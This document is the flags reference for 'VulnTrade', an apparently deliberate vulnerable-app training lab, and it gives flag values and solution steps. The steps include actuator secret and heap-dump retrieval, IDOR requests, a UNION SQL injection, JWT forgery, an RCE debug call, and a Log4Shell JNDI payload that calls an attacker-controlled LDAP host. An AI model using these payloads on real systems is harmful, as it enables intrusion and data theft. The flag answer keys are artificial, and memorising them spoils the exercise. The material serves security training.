# 10 — CTF Flags Reference

## Overview
VulnTrade contains 12 numbered CTF flags hidden throughout the application (plus a handful of bonus flags in user data and the hidden `flags` table). They range from beginner (read an exposed endpoint) to advanced (chain multiple exploits). Each flag is a reward for successfully exploiting a vulnerability or completing an attack chain.

> **How flags are retrieved (read this first).** Not every flag has code that hands it to you on success. Some exploits *prove the weakness* but the flag string itself lives elsewhere and must be read out:
> - **Returned by a code path** on success: FLAG 2, 6 (IDOR profile/portfolio notes), FLAG 7 (admin WS broadcast), FLAG 11 (rank-#1 leaderboard banner).
> - **Read from the hidden `flags` DB table** (via SQLi or the admin raw-SQL executor — the "Flag 4 technique"): FLAG 4, FLAG 9, plus the DB bonus rows.
> - **Read from the environment / config** via `/actuator/env` or `/actuator/configprops` (secret masking is OFF, so values appear in clear text): FLAG 1, FLAG 10.
> - **Read from the container filesystem** via RCE: FLAG 5, FLAG 12.
> - **Memory**: FLAG 8 (heap dump).
> - **Not currently obtainable**: FLAG 3 (the Redis `flag3` key is not seeded — see below).

---

## Flag Scoreboard

| # | Flag Value | Points | Difficulty | Category |
|---|-----------|--------|------------|----------|
| 1 | `FLAG{4ctu4t0r_3xp0s3d_s3cr3ts}` | 100 | Beginner | Misconfiguration |
| 2 | `FLAG{1d0r_4dm1n_pr0f1l3_n0t3s}` | 200 | Beginner | IDOR |
| 3 | `FLAG{r3d1s_n0_4uth_p1v0t}` | 150 | Beginner | Infrastructure *(not seeded — unobtainable today)* |
| 4 | `FLAG{sql1_h1dd3n_t4bl3_fl4g}` | 300 | Intermediate | SQL Injection |
| 5 | `FLAG{rc3_f1l3syst3m_4cc3ss}` | 400 | Advanced | RCE |
| 6 | `FLAG{h0r1z0nt4l_pr1v3sc_p0rtf0l10}` | 200 | Beginner | IDOR |
| 7 | `FLAG{st0mp_4dm1n_ch4nn3l_l34k}` | 250 | Intermediate | WebSocket |
| 8 | `FLAG{h34pdump_m3m0ry_s3cr3ts}` | 300 | Intermediate | Misconfiguration |
| 9 | `FLAG{jwt_l3v3l_byp4ss_n0_db_ch3ck}` | 300 | Intermediate | JWT |
| 10 | `FLAG{jwt_f0rg3d_4dm1n_m4st3r}` | 350 | Advanced | JWT |
| 11 | `FLAG{m4rk3t_m4n1pul4t0r_numb3r_0n3}` | 500 | Expert | Business Logic |
| 12 | `FLAG{l0g4sh3ll_rc3_tr4d1ng_pl4tf0rm}` | 500 | Expert | RCE (Log4Shell) |

**Total possible: 3,550 points** — of which **3,400 are currently achievable** (FLAG 3 / 150 pts is pending a Redis seed, see below).

---

## Detailed Flag Guide

### FLAG 1: Actuator Secrets
**Value:** `FLAG{4ctu4t0r_3xp0s3d_s3cr3ts}`
**Points:** 100 | **Difficulty:** Beginner

**Location:** Environment variable `FLAG_1` (`application.yml:110` → `${FLAG_1:...}`), exposed via Spring Boot Actuator.

**How to find:**
```bash
curl http://localhost:8085/actuator/env | jq '.propertySources'
```
Look for the `FLAG_1` property in the system environment section. Secret masking is disabled (empty `keys-to-sanitize` on Boot 2.7), so the value is shown in **clear text** rather than `******`.

**What you learn:** Never expose actuator endpoints without authentication. Use `management.endpoints.web.exposure.include` to limit which endpoints are accessible.

---

### FLAG 2: Admin Profile Notes (IDOR)
**Value:** `FLAG{1d0r_4dm1n_pr0f1l3_n0t3s}`
**Points:** 200 | **Difficulty:** Beginner

**Location:** `notes` field of admin user (userId=1).

**How to find:**
```bash
curl http://localhost:8085/api/users/1 \
  -H "Authorization: Bearer <any-valid-token>"
```
The response includes: `"notes": "Admin account. FLAG{1d0r_4dm1n_pr0f1l3_n0t3s} - TODO: move this to a secure location"`

---

### FLAG 3: Redis No Authentication
**Value:** `FLAG{r3d1s_n0_4uth_p1v0t}`
**Points:** 150 | **Difficulty:** Beginner
**Status:** NOT currently obtainable (planned) — the `flag3` key is not seeded.

**Location:** Intended Redis key `flag3`.

**How to find (intended):**
```bash
redis-cli -h localhost -p 6379 GET flag3
```
Redis has no password — the connection succeeds and `PING`/`KEYS *` work unauthenticated (the infra weakness is real and verified, see [08-infrastructure.md](08-infrastructure.md) INFRA-01). **However, nothing seeds `flag3` into Redis**, so `GET flag3` returns `(nil)` and this flag cannot be captured today. Treat it as a planned addition: until a seed writes the key, the Redis no-auth pivot is demonstrable but the reward string is not present.

---

### FLAG 4: Hidden Flags Table (SQL Injection)
**Value:** `FLAG{sql1_h1dd3n_t4bl3_fl4g}`
**Points:** 300 | **Difficulty:** Intermediate

**Location:** `flags` database table — not referenced by any JPA entity, only discoverable via SQL injection.

**How to find:**
1. Go to History page
2. In Symbol field enter: `' UNION SELECT 1, flag_value, 3, 4, now() FROM flags --` (the base query selects 5 columns: `id, symbol, quantity, price, executed_at` — match the count)
3. Click "Load via WebSocket"

Or via the admin raw-SQL executor (`POST /api/admin/execute-query`, which is ADMIN-gated — forge the role first): `SELECT * FROM flags`

---

### FLAG 5: Filesystem Access (RCE)
**Value:** `FLAG{rc3_f1l3syst3m_4cc3ss}`
**Points:** 400 | **Difficulty:** Advanced

**Location:** `/opt/flags/flag5.txt` on the backend container filesystem.

**How to find:**
```bash
curl -X POST http://localhost:8085/api/debug/execute \
  -H "X-Debug-Key: vulntrade-debug-key-2024" \
  -H "Content-Type: application/json" \
  -d '{"command":"cat /opt/flags/flag5.txt"}'
```
Requires discovering the hardcoded debug key (check `/actuator/env` or application config).

---

### FLAG 6: Horizontal Privilege Escalation (Portfolio IDOR)
**Value:** `FLAG{h0r1z0nt4l_pr1v3sc_p0rtf0l10}`
**Points:** 200 | **Difficulty:** Beginner

**Location:** `notes` field of trader2's user profile (userId=3).

**How to find:**
```bash
curl http://localhost:8085/api/users/3/portfolio \
  -H "Authorization: Bearer <any-valid-token>"
```
Response includes: `"notes": "Test trader account 2 - has secret portfolio FLAG{h0r1z0nt4l_pr1v3sc_p0rtf0l10}"`

---

### FLAG 7: WebSocket Admin Channel Leak
**Value:** `FLAG{st0mp_4dm1n_ch4nn3l_l34k}`
**Points:** 250 | **Difficulty:** Intermediate

**Location:** Broadcast on `/topic/admin/alerts` WebSocket channel.

**How to find:**
1. Connect to WebSocket
2. Subscribe to `/topic/admin/alerts` (no admin check)
3. The flag is broadcast periodically in admin alert messages

---

### FLAG 8: Heap Dump Memory Secrets
**Value:** `FLAG{h34pdump_m3m0ry_s3cr3ts}`
**Points:** 300 | **Difficulty:** Intermediate

**Location:** In the JVM heap dump.

**How to find:**
```bash
curl http://localhost:8085/actuator/heapdump -o heap.bin
strings heap.bin | grep "FLAG{"
```

---

### FLAG 9: JWT Account Level Bypass
**Value:** `FLAG{jwt_l3v3l_byp4ss_n0_db_ch3ck}`
**Points:** 300 | **Difficulty:** Intermediate

**Location:** Hidden `flags` DB table, row `FLAG_ACCOUNT_LEVEL`.

**How to find:** Forge a JWT with the `accountLevel:2` claim (weak secret or alg:none). The server trusts the claim without any DB verification, unlocking deposit/withdraw for an otherwise-unverified account — the bypass is **proven** (see AUTH-07 / AUTHZ-11 in [02-authorization.md](02-authorization.md)). **No endpoint returns this flag on the bypass itself**, though — the reward string lives in the `flags` table (`FLAG_ACCOUNT_LEVEL`). Read it out with the Flag 4 technique: the admin raw-SQL executor (`POST /api/admin/execute-query` with a forged ADMIN role) or UNION-based SQLi over `/app/trade.getHistory`.

---

### FLAG 10: JWT Admin Forgery
**Value:** `FLAG{jwt_f0rg3d_4dm1n_m4st3r}`
**Points:** 350 | **Difficulty:** Advanced

**Location:** Environment variable `FLAG_10` (`application.yml:113` → `${FLAG_10:...}`).

**How to find:**
1. Discover the JWT secret (`vulntrade-secret`) via `/actuator/env` (now in clear text) or source
2. Forge a JWT with `role:ADMIN` (weak-secret HS256, or alg:none — see AUTH-04 / AUTH-06)
3. Reach the admin API — `/api/admin/**` is role-gated but trusts the forgeable JWT role, so the forged token walks in (AUTHZ-12) and dumps every user's PII/apiKey/notes
4. **The flag itself is not returned by any admin endpoint.** Its value is the `FLAG_10` environment variable — read it from `/actuator/env` or `/actuator/configprops` (secret masking is off, so it appears in clear text)

---

### FLAG 11: Leaderboard Market Manipulation
**Value:** `FLAG{m4rk3t_m4n1pul4t0r_numb3r_0n3}`
**Points:** 500 | **Difficulty:** Expert

**Location:** Returned by the leaderboard API when the authenticated user is rank #1.

**How to find:**
1. Register → verify → deposit funds → buy VULN
2. Manipulate VULN price via WebSocket `admin.setPrice`
3. Portfolio value skyrockets → ROI% goes to #1
4. Visit leaderboard → flag appears in gold banner

This is the hardest flag — it requires chaining 4+ vulnerabilities together. See [09-attack-chains.md](09-attack-chains.md) Chain 1 for the full walkthrough.

---

### FLAG 12: Log4Shell RCE (CVE-2021-44228)
**Value:** `FLAG{l0g4sh3ll_rc3_tr4d1ng_pl4tf0rm}`
**Points:** 500 | **Difficulty:** Expert

**Location:** `/opt/flags/flag_log4shell.txt` on the backend container filesystem.

**How to find:**
1. Discover that VulnTrade uses Log4j2 2.14.1 (check `/actuator/env` or `pom.xml`)
2. Identify user-controlled data flowing into logger calls (the `reason` field in admin operations)
3. Set up an attacker LDAP server (marshalsec) + HTTP server hosting an exploit class
4. Inject `${jndi:ldap://YOUR_IP:1389/Exploit}` as the `reason` in Halt Trading via WebSocket:
   ```javascript
   sendMessage('/app/admin.haltTrading', {
     symbol: 'AAPL',
     reason: '${jndi:ldap://YOUR_IP:1389/Exploit}'
   });
   ```
5. The exploit class executes `cat /opt/flags/flag_log4shell.txt` and exfiltrates the flag

This is tied with FLAG 11 as the hardest flag — it requires understanding Log4Shell mechanics, setting up external infrastructure, and delivering the payload via WebSocket (not standard HTTP).

See [03-injection.md](03-injection.md) INJ-11 for the full exploitation walkthrough.

---

## Bonus Flags (Hidden in User Data)

### 0xj4f Easter Egg
**Value:** `FLAG{0xj4f_w4s_h3r3_bu1ld1ng_vuln5}`
**Location:** `notes` field of the `0xj4f` user, visible via IDOR (`/api/users/{id}`) or leaderboard API response.

### Admin SSN Flag
**Value:** `FLAG{ssn_exposed_in_jwt}`
**Location:** Admin user's `ssn` field. Also stored in the `flags` table. Visible by decoding a Level 2 admin JWT or via IDOR on the admin profile.

---

## Hidden Flags Table (Database)

These additional flags are only in the `flags` SQL table — discoverable exclusively via SQL injection:

| Flag Name | Value | Hint |
|-----------|-------|------|
| FLAG_SECRET | `FLAG{b0nus_y0u_dump3d_th3_wh0l3_db}` | Full database enumeration |
| DB_MASTER_KEY | `FLAG{d4t4b4s3_m4st3r_k3y_3xtr4ct3d}` | Database master key extraction |
